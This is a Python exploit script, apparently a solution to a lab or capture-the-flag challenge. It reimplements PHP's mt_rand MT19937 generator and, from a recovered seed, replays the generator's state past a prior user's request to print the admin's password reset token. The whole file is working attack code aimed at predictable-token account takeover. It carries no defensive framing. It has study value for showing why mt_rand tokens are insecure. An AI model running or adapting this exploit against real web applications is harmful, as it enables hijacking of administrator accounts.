#!/usr/bin/env python3
"""

replay_mt.py - Given a recovered MT19937 seed, replay the PRNG state
to extract the admin's password reset token.

Usage: python3 replay_mt.py <seed>
"""

import sys

MT_N = 624
MT_M = 397


class PHPMT19937:
    """Faithful reimplementation of PHP's MT19937 (MT_RAND_MT19937 mode, 64-bit)."""

    def __init__(self):
        self.mt = [0] * MT_N
        self.idx = MT_N + 1

    def seed(self, s):
        s = s & 0xFFFFFFFF
        self.mt[0] = s
        for i in range(1, MT_N):
            self.mt[i] = (
                1812433253 * (self.mt[i - 1] ^ (self.mt[i - 1] >> 30)) + i
            ) & 0xFFFFFFFF
        self.idx = MT_N

    def _generate(self):
        for i in range(MT_N):
            y = (self.mt[i] & 0x80000000) | (self.mt[(i + 1) % MT_N] & 0x7FFFFFFF)
            self.mt[i] = self.mt[(i + MT_M) % MT_N] ^ (y >> 1)
            if y & 1:
                self.mt[i] ^= 0x9908B0DF

    def rand_uint32(self):
        if self.idx >= MT_N:
            self._generate()
            self.idx = 0
        y = self.mt[self.idx]
        self.idx += 1
        y ^= y >> 11
        y ^= (y << 7) & 0x9D2C5680
        y ^= (y << 15) & 0xEFC60000
        y ^= y >> 18
        return y

    def rand_range(self, min_val, max_val):
        """
        PHP mt_rand(min, max) in MT_RAND_MT19937 mode on 64-bit systems.

        On 64-bit PHP, the rejection limit is based on ZEND_ULONG_MAX (2^64-1),
        which is always larger than any 32-bit MT output. So no rejection
        sampling ever occurs, and this simplifies to: raw_output % range.
        """
        umax = max_val - min_val
        if umax == 0:
            return min_val
        rng = umax + 1
        result = self.rand_uint32()
        return min_val + (result % rng)


# Application constants (from /app/webapp/config.php)
CHARSET = "9aGkR1mBvXpTnHcW4QYeZfLgUhJi0DO2Fs3dtKwN5oAlSbjMxEy7PqC8rIu6Vz"
CSRF_LEN = 8
TRACKING_LEN = 12
JITTER_COUNT = 3
JITTER_MIN = 100
JITTER_MAX = 9999
TOKEN_LEN = 32
AUDIT_LEN = 8


def generate_string(mt, length):
    return "".join(CHARSET[mt.rand_range(0, 61)] for _ in range(length))


def skip_jitter(mt):
    for _ in range(JITTER_COUNT):
        mt.rand_range(JITTER_MIN, JITTER_MAX)


def skip_request(mt):
    """Advance PRNG state past one full request."""
    generate_string(mt, CSRF_LEN)      # CSRF nonce
    generate_string(mt, TRACKING_LEN)  # tracking ID
    skip_jitter(mt)                    # jitter values
    generate_string(mt, TOKEN_LEN)     # reset token
    generate_string(mt, AUDIT_LEN)     # audit ID


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <seed>", file=sys.stderr)
        sys.exit(1)

    seed = int(sys.argv[1])
    mt = PHPMT19937()
    mt.seed(seed)

    # Request 1 (alice) — skip entirely
    skip_request(mt)

    # Request 2 (admin) — skip prefix, extract token
    generate_string(mt, CSRF_LEN)      # CSRF nonce (skip)
    generate_string(mt, TRACKING_LEN)  # tracking ID (skip)
    skip_jitter(mt)                    # jitter (skip)

    # Extract admin's reset token
    admin_token = generate_string(mt, TOKEN_LEN)
    print(admin_token)


if __name__ == "__main__":
    main()
